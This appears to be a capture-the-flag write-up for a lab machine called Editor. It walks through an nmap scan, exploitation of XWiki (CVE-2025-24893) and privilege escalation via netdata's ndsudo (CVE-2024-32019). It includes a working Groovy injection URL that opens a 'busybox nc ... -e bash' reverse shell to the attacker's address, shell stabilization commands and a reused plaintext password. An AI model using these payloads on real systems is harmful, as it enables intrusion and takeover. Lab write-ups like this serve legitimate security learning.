
![[editor logo.png]]


```
nmap -sVC 10.129.32.252 -oN scan.txt
```

```
<SNIP>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
|_/xwiki/bin/undelete/
| http-methods:
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.32.252:8080/xwiki/bin/view/Main/
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```


```
echo '10.129.32.252 editor.htb' | tee -a /etc/hosts
```

I first went on port 80

![Pasted image 20260106123815](Images/Pasted%20image%2020260106123815.png)

It appears its a website site providing a solution to code easier.
I didn't find anything useful so i got to port 8080.

I discovered a robots.txt file, and i noted the version of the website in use.

![Pasted image 20260106123747](Images/Pasted%20image%2020260106123747.png)

---

## Web Exploit

I searched for an exploit for that version and i found that [exploit](https://www.exploit-db.com/exploits/52136) 

Which i reproduced on the target

Firstly, i have to get the exploit from the repo

```
wget https://raw.githubusercontent.com/a1baradi/Exploit/refs/heads/main/CVE-2025-24893.py
```

Then i had to edit the exploit to match our current website. 

So i modified it from this

```
# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async
```
To this

```
# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async
```

If i didn't do this, the exploit would simply fail

Now let's try the exploit on the target

```
python3 CVE-2025-24893.py
```

![Pasted image 20260106125113](Images/Pasted%20image%2020260106125113.png)

And it worked. So let's try to get a reverse shell by modifying the command in the exploit with that payload

```
busybox nc 10.10.14.230 9001 -e bash
```

I tried a lot of different payload but that is the only one that worked for me

So our url should look like this

```
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22busybox%20nc%2010.10.14.230%204444%20-e%20bash%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
```

After putting that in our browser, we should get a reverse shell

![Pasted image 20260106145419](Images/Pasted%20image%2020260106145419.png)

It indeed worked, so let's first stabilize our shell

```
export TERM=xterm
```
```
which python3
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Then we press CTRL + Z and we enter this command

```
stty raw -echo && fg
```
And we press ENTER, we should have a interactive shell now.


---

## Pivot

After digging a lot on the target, i found a config file in `/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF` named **`hibernate.cfg.xml`** where i found the password

```
theEd1t0rTeam99
```

![Pasted image 20260106153535](Images/Pasted%20image%2020260106153535.png)

I know that there is the user `oliver` on the target and that it's home directory was denied to us, let's try this password for oliver with ssh.

```
ssh oliver@10.129.32.252
```

![Pasted image 20260106153749](Images/Pasted%20image%2020260106153749.png)

It was the correct password, let's look for privesc now


---

## Privesc

After doing basic commands 

```
id 

uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

```
find / -perm -4000 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

There is a lot of uncommon binary that has SUID set, so i looked for an exploit online, and i found this one

https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC

After reproducing it, i got root access and got the flag

![Pasted image 20260106155648](Images/Pasted%20image%2020260106155648.png)